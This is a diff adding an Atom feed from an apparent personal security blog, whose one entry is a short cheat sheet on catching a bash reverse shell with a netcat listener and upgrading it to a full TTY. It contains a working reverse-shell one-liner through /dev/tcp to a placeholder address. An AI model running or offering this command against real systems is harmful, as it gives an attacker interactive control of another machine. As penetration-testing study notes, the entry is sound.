@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>nu1lptr - Shell Upgrade</title>
+    <subtitle>Learner // Cybersecurity Ph.D.@UMich CSE // Photographer</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://shengtuo.me/tags/shell-upgrade/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://shengtuo.me"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-08-15T15:24:53-07:00</updated>
+    <id>https://shengtuo.me/tags/shell-upgrade/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Shell Upgrade</title>
+        <published>2025-08-15T15:24:53-07:00</published>
+        <updated>2025-08-15T15:24:53-07:00</updated>
+        
+        <author>
+          <name>
+            Shengtuo Hu
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://shengtuo.me/blog/shell-upgrade/"/>
+        <id>https://shengtuo.me/blog/shell-upgrade/</id>
+        
+        <content type="html" xml:base="https://shengtuo.me/blog/shell-upgrade/">&lt;h2 id=&quot;reverse-shell&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-shell&quot; aria-label=&quot;Anchor link for: reverse-shell&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Reverse Shell&lt;/h2&gt;
+&lt;p&gt;A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myip: ip address of the local machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myport: local port&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the local machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -lnvp&lt;/span&gt;&lt;span&gt; $myport&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Waiting for the connection&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the remote machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -i&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; &amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/tcp/&lt;/span&gt;&lt;span&gt;$myip&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt;/&lt;/span&gt;&lt;span&gt;$myport&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;shell-upgrade&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-upgrade&quot; aria-label=&quot;Anchor link for: shell-upgrade&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Shell Upgrade&lt;/h2&gt;
+&lt;p&gt;After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Get a TTY&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/null -c bash&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Hit ^Z to send the local `nc` process to the background&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Disable &amp;quot;echo&amp;quot; for the local TTY and bring back `nc` process&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;stty&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; raw -echo&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;z-2&quot;&gt; fg&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Reset the remote shell&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;reset&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Note that, you won&amp;#39;t see anything now, but remember to type in &amp;quot;screen&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+References&lt;/h2&gt;
+&lt;iframe
+	class=&quot;youtube-embed&quot;
+	src=&quot;https://www.youtube-nocookie.com/embed/DqE6DxqJg8Q&quot;
+	allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot;
+	referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&gt;
+&lt;/iframe&gt;
+</content>
+        
+    </entry>
+</feed>
